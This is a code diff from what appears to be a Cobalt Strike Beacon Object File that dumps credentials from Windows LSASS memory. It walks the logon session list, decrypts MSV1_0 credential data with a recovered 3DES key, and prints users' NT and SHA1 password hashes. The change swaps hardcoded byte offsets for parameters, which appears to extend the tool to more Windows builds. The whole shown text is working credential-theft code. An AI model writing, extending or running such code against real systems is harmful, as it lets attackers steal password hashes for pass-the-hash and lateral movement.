@@ -154,7 +154,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     return Real_LogonSessionList_Address;
 }
 
-BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector, int UserNameOffset, int DomainOffset, int CredentialsOffset)
+BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector, int UserNameOffset, int DomainOffset, int CredentialsOffset, int NtHashOffset, int Sha1HashOffset)
 {
     DWORD64 tmpPA = 0;
     DWORD64 kMSV1_0_LIST_63 = 0;
@@ -249,23 +249,13 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
                         if (status == STATUS_SUCCESS)
                         {
                             BeaconFormatPrintf(&outputbuffer, "\t    * NT Hash     : ");
-                            for (int j = 0; j < cbResult; j++)
-                            {
-                                if (j >= 74 && j < 90) // 4A to 5A
-                                {
-                                    BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
-                                }
-                            }
+                            for (int j = NtHashOffset; j < NtHashOffset + 16; j++)
+                                BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
                             BeaconFormatPrintf(&outputbuffer, "\n");
 
                             BeaconFormatPrintf(&outputbuffer, "\t    * SHA1 Hash   : ");
-                            for (int j = 0; j < cbResult; j++)
-                            {
-                                if (j >= 106 && j < 126) // 6A to 7E
-                                {
-                                    BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
-                                }
-                            }
+                            for (int j = Sha1HashOffset; j < Sha1HashOffset + 20; j++)
+                                BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
                             BeaconFormatPrintf(&outputbuffer, "\n");
                         }
                         else
